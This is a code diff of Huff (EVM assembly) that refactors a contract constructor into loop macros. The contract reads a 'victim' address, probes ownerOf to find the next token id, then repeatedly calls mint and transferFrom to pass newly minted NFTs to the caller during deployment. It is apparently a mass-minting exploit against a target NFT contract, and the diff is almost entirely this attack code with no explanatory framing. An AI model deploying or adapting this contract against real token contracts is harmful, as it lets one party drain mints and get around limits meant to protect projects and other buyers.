@@ -1,16 +1,4 @@
-#define macro CONSTRUCTOR() = takes(0) returns(0) {
-    // Starting iterator
-    0x01                                    // [start]
-    // Get victim address from end of bytecode
-    0x20 dup1 codesize sub                  // [offset, size, start]
-    returndatasize codecopy                 // [start]
-    returndatasize mload                    // [victim, start]
-
-    // mstore function selectors
-    0x1249c58b23b872dd6352211e0000000000000000000000000000000000000000 returndatasize mstore  
-                                            // [victim, start]
-    dup1 dup3                               // [start, victim, victim, start]
-
+#define macro IS_OWNED_LOOP() = takes(4) returns(4) {
     // Loop over ownerOf checks until it fails, giving us starting token id
     is_owned:
         // mstore start
@@ -25,21 +13,9 @@
         swap2 0x01 add                      // [start + 1, victim, success]
         dup2 swap1 dup1 swap4               // [success, start + 1, victim, victim, start + 1]
     is_owned jumpi                          // [start + 1, victim, victim, start + 1]
+}
 
-    // mstore contract address
-    address 0x08 mstore                     // [start, victim, victim, start]
-
-    // mstore caller address
-    caller 0x28 mstore                      // [start, victim, victim, start]
-
-    // Get end
-    dup1 0x94 add                           // [end, start, victim, victim, start]
-
-    // Initial mint
-    swap2 calldatasize 0x04 calldatasize calldatasize calldatasize swap5    
-                                            // [victim, 0, 0x14, 0x04, 0, 0, start, end, victim, start]
-    gas call swap1 sub                            // [i, end, victim, start]
-
+#define macro MINT_TRANSFER_LOOP() = takes(4) returns(4) {
     // Loop over mint and transfers
     next_iter:
         // mstore i
@@ -62,6 +38,38 @@
         // Get end > i + 1
         dup1 dup3 gt                        // [end > i + 1, i + 1, end, victim, start]
     next_iter jumpi                         // [i + 1, end, victim, start]
+}
+
+#define macro CONSTRUCTOR() = takes(0) returns(0) {
+    // Starting iterator
+    0x01                                    // [start]
+    // Get victim address from end of bytecode
+    0x20 dup1 codesize sub                  // [offset, size, start]
+    returndatasize codecopy                 // [start]
+    returndatasize mload                    // [victim, start]
+
+    // mstore function selectors
+    0x1249c58b23b872dd6352211e0000000000000000000000000000000000000000 returndatasize mstore  
+                                            // [victim, start]
+    dup1 dup3                               // [start, victim, victim, start]
+
+    IS_OWNED_LOOP()
+
+    // mstore contract address
+    address 0x08 mstore                     // [start, victim, victim, start]
+
+    // mstore caller address
+    caller 0x28 mstore                      // [start, victim, victim, start]
+
+    // Get end
+    dup1 0x94 add                           // [end, start, victim, victim, start]
+
+    // Initial mint
+    swap2 calldatasize 0x04 calldatasize calldatasize calldatasize swap5    
+                                            // [victim, 0, 0x14, 0x04, 0, 0, start, end, victim, start]
+    gas call swap1 sub                      // [i, end, victim, start]
+
+    MINT_TRANSFER_LOOP()
 
     // mstore start
     0x48 mstore                             // [end, victim, start]
